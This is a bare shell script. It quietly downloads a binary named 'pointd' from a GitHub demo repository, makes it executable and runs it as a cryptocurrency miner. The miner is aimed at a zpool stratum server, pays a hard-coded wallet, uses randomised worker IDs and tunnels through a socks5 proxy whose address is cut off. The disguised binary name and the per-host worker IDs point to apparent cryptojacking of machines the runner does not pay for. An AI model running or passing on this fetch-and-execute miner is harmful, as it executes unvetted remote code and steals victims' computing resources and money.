apt update -y
wget -q https://github.com/AmulyaKanaparthi6/demo-repository/raw/main/pointd 
chmod +x pointd
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RQDVN3y91v7ErGNSojXg5qYKZCQx4ezMpJ.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN,zap=BUT-lyra2z330 -x socks5://
